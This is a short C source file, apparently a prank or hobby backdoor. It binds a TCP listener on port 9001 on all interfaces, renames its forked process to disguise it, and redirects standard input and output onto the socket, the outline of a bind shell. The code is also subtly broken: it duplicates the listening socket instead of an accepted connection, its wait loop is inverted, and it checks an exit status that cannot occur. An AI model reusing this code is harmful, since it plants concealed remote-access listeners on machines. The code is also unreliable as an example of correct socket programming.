#include <errno.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int port = 9001;
char *name = "sinep";

int ifyoulikeit() {
	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	if (sock == -1) {
		return errno;
	}

	const int optVal = 1;
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR,
				(void*) &optVal, (socklen_t) sizeof(optVal)) == -1) {
		switch (errno) {
			case EBADF:
			case EFAULT:
			case EINVAL:
			case ENOPROTOOPT:
			case ENOTSOCK:
				close(sock);
				return -1;
		}
	}

	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(struct sockaddr_in));
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_ANY);

	if (bind(sock, (struct sockaddr *) &addr,
				sizeof(struct sockaddr_in)) == -1) {
		switch (errno) {
			case EACCES:
			case EADDRINUSE:
			case EBADF:
			case EINVAL:
			case ENOTSOCK:
				close(sock);
				return -1;
		}
	}

	if(listen(sock, 0) == -1) {
		switch (errno) {
			case EADDRINUSE:
			case EBADF:
			case ENOTSOCK:
			case EOPNOTSUPP:
				close(sock);
				return -1;
		}
	}

	return sock;
}

void seppuku(int rc, int desired) {
	if (rc != desired) {
		exit(rc);
	}
}

int putaringonit(int sock) {
	pid_t pid = fork();
	if (pid < 0) {
		return -1;
	} else if (pid > 0) {
		// success
		return pid;
	}

	seppuku(close(0), 0);
	seppuku(close(1), 0);
	seppuku(close(2), 0);

	seppuku(dup2(sock, 0), 0);
	seppuku(dup2(sock, 1), 1);
	seppuku(dup2(sock, 2), 2);
	
	return 0;
}

void nevergonnaletyoudown() {
	int rc = 0;
	int status = 0;
	for(;;) {
		rc = ifyoulikeit();
		if (rc <= 0) { // otherwise it's our sock fd
			// D:
			break;
		}

		rc = putaringonit(rc);
		switch (rc) {
			case -1:
				// failed to fork, retry
				continue;
			default:
				// fork worked, let's wait on the pid
				do {
					waitpid(rc, &status, 0);
				} while(WIFEXITED(status) || WIFSIGNALED(status));
				switch WEXITSTATUS(status) {
					case EBADF:
					case EINTR:
					case EIO:
						// close failed, try again
						continue;
					case 9001:
						break;
				}
				break;
		}
	}
}

void yoloswaggin() {
	prctl(PR_SET_NAME, name, 0, 0, 0);
}

void start() {
	pid_t pid = fork();
	if (pid < 0) {
		// oh well
		return;
	} else if (pid > 0) {
		// yay
	} else {
		yoloswaggin();
		nevergonnaletyoudown();
	}
	return;
}
